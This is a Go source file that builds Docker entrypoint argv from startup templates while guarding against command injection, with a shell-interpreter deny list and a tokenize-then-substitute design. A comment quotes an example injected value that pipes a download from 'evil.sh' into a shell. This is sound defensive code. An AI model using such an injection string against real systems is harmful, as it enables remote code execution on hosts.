package spec

import (
	"fmt"
	"strings"
)

// forbiddenArgv0 lists interpreters that must never be argv[0] of a game
// server container. A template that "needs a shell" must ship a script
// baked into the image instead — see the tokenize-then-substitute rule
// below for why.
var forbiddenArgv0 = map[string]bool{
	"sh": true, "bash": true, "dash": true, "zsh": true, "ash": true,
	"env": true, "eval": true, "csh": true, "ksh": true, "busybox": true,
}

// BuildArgv converts a template's startup command string into a Docker
// Entrypoint argv slice, safely substituting customer-supplied variables.
//
// This is the single most important function in the agent with respect to
// command injection. The naive implementation is
// `[]string{"/bin/sh", "-c", interpolate(tmpl, vars)}` — that is a shell
// injection hole: a customer variable containing `; curl evil.sh | sh`
// becomes arbitrary code execution as the container user.
//
// The rule instead is: TOKENIZE FIRST, SUBSTITUTE SECOND, NEVER RE-PARSE.
//  1. Tokenize the template string (admin-authored, trusted) once, using
//     shell-like word splitting that understands quotes.
//  2. For each resulting token, replace {{VAR}} placeholders with the raw
//     variable value. Substitution happens INSIDE a token, so the result
//     is always exactly one argv element — a value containing shell
//     metacharacters just becomes a literal (harmless) argument.
//  3. The result becomes Entrypoint directly; Cmd is left nil. No shell
//     ever parses the substituted result.
func BuildArgv(startupTemplate string, vars map[string]string) ([]string, error) {
	tokens, err := tokenize(startupTemplate)
	if err != nil {
		return nil, fmt.Errorf("spec: invalid startup template: %w", err)
	}
	if len(tokens) == 0 {
		return nil, fmt.Errorf("spec: startup template produced no argv tokens")
	}

	argv := make([]string, 0, len(tokens))
	for _, tok := range tokens {
		substituted, err := substitute(tok, vars)
		if err != nil {
			return nil, err
		}
		argv = append(argv, substituted)
	}

	if forbiddenArgv0[argv[0]] {
		return nil, fmt.Errorf(
			"spec: startup command may not begin with a shell/interpreter (%q); "+
				"ship a script baked into the image instead of shelling out", argv[0])
	}
	for i, a := range argv {
		if strings.IndexByte(a, 0) != -1 {
			return nil, fmt.Errorf("spec: argv[%d] contains a NUL byte", i)
		}
	}
	return argv, nil
}

// tokenize splits a template string into words using shell-like rules:
// whitespace separates tokens, single and double quotes group a token
// (quotes are stripped from the *template* itself — this happens on
// admin-authored text, before any customer value is substituted, so it is
// not an injection surface), and a backslash escapes the next character.
//
// {{VAR}} placeholders are left untouched here; substitution is a later,
// separate pass over each already-finalized token (see substitute).
func tokenize(s string) ([]string, error) {
	var tokens []string
	var cur strings.Builder
	inToken := false
	var quote rune // 0, '\'', or '"'

	flush := func() {
		if inToken {
			tokens = append(tokens, cur.String())
			cur.Reset()
			inToken = false
		}
	}

	runes := []rune(s)
	for i := 0; i < len(runes); i++ {
		r := runes[i]
		switch {
		case quote != 0:
			if r == quote {
				quote = 0
				continue
			}
			if r == '\\' && quote == '"' && i+1 < len(runes) {
				next := runes[i+1]
				if next == '"' || next == '\\' {
					cur.WriteRune(next)
					i++
					continue
				}
			}
			cur.WriteRune(r)
		case r == '\'' || r == '"':
			quote = r
			inToken = true
		case r == '\\':
			if i+1 >= len(runes) {
				return nil, fmt.Errorf("dangling backslash at end of template")
			}
			cur.WriteRune(runes[i+1])
			inToken = true
			i++
		case r == ' ' || r == '\t' || r == '\n' || r == '\r':
			flush()
		default:
			cur.WriteRune(r)
			inToken = true
		}
	}
	if quote != 0 {
		return nil, fmt.Errorf("unterminated quote in template")
	}
	flush()
	return tokens, nil
}

// substitute replaces every {{NAME}} occurrence inside a single token with
// the corresponding value from vars. Unknown variables are an error rather
// than silently substituting an empty string, so a misconfigured template
// fails loudly instead of launching a broken server.
func substitute(token string, vars map[string]string) (string, error) {
	var out strings.Builder
	i := 0
	for i < len(token) {
		start := strings.Index(token[i:], "{{")
		if start == -1 {
			out.WriteString(token[i:])
			break
		}
		start += i
		out.WriteString(token[i:start])

		end := strings.Index(token[start+2:], "}}")
		if end == -1 {
			return "", fmt.Errorf("spec: unterminated {{ in startup template near %q", token)
		}
		end += start + 2

		name := strings.TrimSpace(token[start+2 : end])
		val, ok := vars[name]
		if !ok {
			return "", fmt.Errorf("spec: startup template references undeclared variable %q", name)
		}
		out.WriteString(val)
		i = end + 2
	}
	return out.String(), nil
}
